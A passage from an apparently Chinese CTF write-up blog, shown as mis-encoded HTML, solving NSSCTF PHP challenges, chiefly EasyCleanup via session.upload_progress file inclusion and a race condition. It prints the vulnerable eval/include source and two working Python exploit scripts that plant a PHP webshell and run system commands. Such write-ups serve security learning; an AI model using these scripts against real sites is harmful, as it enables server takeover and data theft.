class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26770/?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721133554786.png" alt="image-20240721133554786"></p>
<h2 id="ç¬¬äº”ç©ºé—´-2021-EasyCleanup-1"><a href="#ç¬¬äº”ç©ºé—´-2021-EasyCleanup-1" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup"></a>[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“ mode&#x3D;eval æ—¶ï¼Œè‹¥ shell æ— å€¼ï¼Œåˆ™æ‰§è¡Œphpinfo();ï¼Œè‹¥æœ‰å€¼åˆ™ç»è¿‡æ»¤åæ‰§è¡Œshellå€¼çš„ä»£ç ï¼›fileæœ‰å€¼æ—¶ç»è¿‡æ»¤åè¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚æ‰€ä»¥æ”»å‡»ç‚¹æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯å˜é‡ shell çš„ RCE ï¼Œä¸€ä¸ªæ˜¯ file çš„æ–‡ä»¶åŒ…å«ï¼Œç”±äº shell å˜é‡éœ€è¦ç»è¿‡<code>if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); </code>ï¼Œé™åˆ¶å¤ªå¤šï¼Œæƒ³è¦é€šè¿‡ RCE å¾—åˆ° flag å‡ ä¹æ— ä»ä¸‹æ‰‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721134646129.png" alt="image-20240721134646129"></p>
<p>äºæ˜¯æˆ‘ä»¬è€ƒè™‘ä»fileå¯»æ‰¾æ”»å‡»ç‚¹ã€‚PHP LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸»è¦æ˜¯åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸€äº›æ–‡ä»¶ï¼Œä¾‹å¦‚ session æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ç­‰ã€‚ä½†æ˜¯ï¼Œåªæœ‰æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶åŒ…å«çš„æ–‡ä»¶å­˜å‚¨æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰èƒ½æ‹¿åˆ°æœåŠ¡å™¨æƒé™ã€‚å‡å¦‚åœ¨æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œé‚£è¯¥æ€ä¹ˆåŠï¼Ÿæ­¤æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨ä¸€äº›æŠ€å·§è®©æœåŠ¡å­˜å‚¨æˆ‘ä»¬æ¶æ„ç”Ÿæˆçš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«æˆ‘ä»¬æ„é€ çš„çš„æ¶æ„ä»£ç ï¼Œæ­¤æ—¶æœåŠ¡å™¨å°±å­˜åœ¨æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶äº†ã€‚é¦–å…ˆçœ‹åˆ©ç”¨æœ€æ–¹ä¾¿çš„æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œæ—¥å¿—æ–‡ä»¶ç›®å½•è·¯å¾„ä¸€èˆ¬è¿‡é•¿ï¼Œä¼šè¢«è¿‡æ»¤æ‰è€Œæ— æ³•åŒ…å«ã€‚ç„¶åå°è¯•ç”¨sessionæ–‡ä»¶åŒ…å«ï¼Œä¸€èˆ¬åˆ©ç”¨GETä¼ å‚å°†æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„ä»£ç ä¼ å…¥sessionä¸­çš„ï¼Œä½†æ²¡æœ‰ GET ä¼ å‚è¿˜èƒ½å¾€ session ä¸­å†™å…¥ä»£ç å—ï¼Ÿå½“ç„¶å¯ä»¥ï¼Œphp 5.4åæ·»åŠ äº† session.upload_progress åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¼€å¯æ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥å°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.auto_startï¼šå¦‚æœ session.auto_start=On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ– Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º offã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰ Session ID çš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨ Cookie é‡Œè®¾ç½® PHPSESSID=ph0ebus ï¼ŒPHP å°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_ph0ebusâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„ session.upload_progress.name å€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥ sess_ æ–‡ä»¶é‡Œã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_pathï¼šè´Ÿè´£ session æ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼Œåé¢æ–‡ä»¶åŒ…å«çš„æ—¶å€™éœ€è¦çŸ¥é“æ¶æ„æ–‡ä»¶çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰é…ç½®åˆ™ä¸ä¼šç”Ÿæˆsessionæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_enabledï¼šå½“è¿™ä¸ªé…ç½®ä¸º On æ—¶ï¼Œä»£è¡¨ session.upload_progress åŠŸèƒ½å¼€å§‹ï¼Œå¦‚æœè¿™ä¸ªé€‰é¡¹å…³é—­ï¼Œåˆ™è¿™ä¸ªæ–¹æ³•ç”¨ä¸äº†</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_cleanupï¼šè¿™ä¸ªé€‰é¡¹é»˜è®¤ä¹Ÿæ˜¯ Onï¼Œä¹Ÿå°±æ˜¯è¯´å½“æ–‡ä»¶ä¸Šä¼ ç»“æŸæ—¶ï¼Œsession æ–‡ä»¶ä¸­æœ‰å…³ä¸Šä¼ è¿›åº¦çš„ä¿¡æ¯ç«‹é©¬å°±ä¼šè¢«åˆ é™¤æ‰ï¼›è¿™é‡Œå°±ç»™æˆ‘ä»¬çš„æ“ä½œé€ æˆäº†å¾ˆå¤§çš„å›°éš¾ï¼Œæˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨æ¡ä»¶ç«äº‰(Race Condition)çš„æ–¹å¼ä¸åœçš„å‘åŒ…ï¼Œäº‰å–åœ¨å®ƒè¢«åˆ é™¤æ‰ä¹‹å‰å°±æˆåŠŸåˆ©ç”¨</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_nameï¼šå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress_prefixï¼šå®ƒï¼‹session.upload_progress_name å°†è¡¨ç¤ºä¸º session ä¸­çš„é”®å</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721135246993.png" alt="image-20240721135246993"></p>
<p>åˆ©ç”¨è¯¥æ¼æ´ç‚¹éœ€è¦æ»¡è¶³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç›®æ ‡ç¯å¢ƒå¼€å¯äº†session.upload_progress.enableé€‰é¡¹</span><br><span class="line">å‘é€ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ–‡ä»¶è¡¨å•å’Œä¸€ä¸ªåå­—æ˜¯PHP_SESSION_UPLOAD_PROGRESSçš„å­—æ®µ</span><br><span class="line">è¯·æ±‚çš„Cookieä¸­åŒ…å«Session ID</span><br><span class="line"></span><br><span class="line">æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åªä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸ä¼šé—ç•™ä¸‹Sessionæ–‡ä»¶çš„ï¼Œæ‰€ä»¥è¡¨å•é‡Œå¿…é¡»æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„æ–‡ä»¶ä¸Šä¼ ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721135511825.png" alt="image-20240721135511825"></p>
<p>php session.upload_progressé€šç”¨åˆ©ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall <span class="keyword">as</span> re_findall</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://node4.anna.nssctf.cn:28463/&#x27;</span></span><br><span class="line">PHPINFO_URL = HOST + <span class="string">&#x27;phpinfo.php&#x27;</span></span><br><span class="line">LFI_URL = HOST + <span class="string">&#x27;index.php&#x27;</span></span><br><span class="line">WEB_SHELL = <span class="string">b&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session_configures = &#123;&#125;</span><br><span class="line">resp_text = re_findall(<span class="string">&#x27;&lt;td class=&quot;e&quot;&gt;session\.(.*?)&lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*?)&lt;/td&gt;&#x27;</span>, requests.get(PHPINFO_URL).text)</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : session_configures.update(&#123;x[<span class="number">0</span>] : x[<span class="number">1</span>]&#125;), resp_text))</span><br><span class="line"><span class="keyword">if</span> session_configures[<span class="string">&#x27;upload_progress.enabled&#x27;</span>] != <span class="string">&#x27;On&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[-] Target is not vulnerable&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_phpinfo</span>():</span><br><span class="line">    exploit = <span class="string">f&quot;&lt;?php file_put_contents(&#x27;/tmp/.shell.php&#x27;, base64_decode(&#x27;<span class="subst">&#123;b64encode(WEB_SHELL).decode()&#125;</span>&#x27;)); echo md5(&#x27;ccc&#x27;);?&gt;&quot;</span></span><br><span class="line">    data = &#123;session_configures[<span class="string">&#x27;upload_progress.name&#x27;</span>] : exploit&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span> : <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;files&#x27;</span> : (<span class="string">&#x27;hello.txt&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">1024</span> * <span class="number">1024</span>)&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        requests.post(PHPINFO_URL, data=data, cookies=cookies, files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_sess_file</span>():</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    data = &#123;<span class="string">&#x27;file&#x27;</span> : session_configures[<span class="string">&#x27;save_path&#x27;</span>] + <span class="string">&#x27;/sess_c&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">        resp = requests.get(LFI_URL, params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;9df62e693988eb4e1e1444ece0578579&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] The webshell was successfully written to /tmp/.shell.php&#x27;</span>)</span><br><span class="line">            success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">Thread(target=request_phpinfo).start()</span><br><span class="line">Thread(target=request_sess_file).start()</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://node4.anna.nssctf.cn:28463/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctfasdasdflag&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721140632112.png" alt="image-20240721140632112"></p>
<h2 id="FSCTF-2023-ez-php2-1"><a href="#FSCTF-2023-ez-php2-1" class="headerlink" title="[FSCTF 2023]ez_php2"></a>[FSCTF 2023]ez_php2</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">Class Rd&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 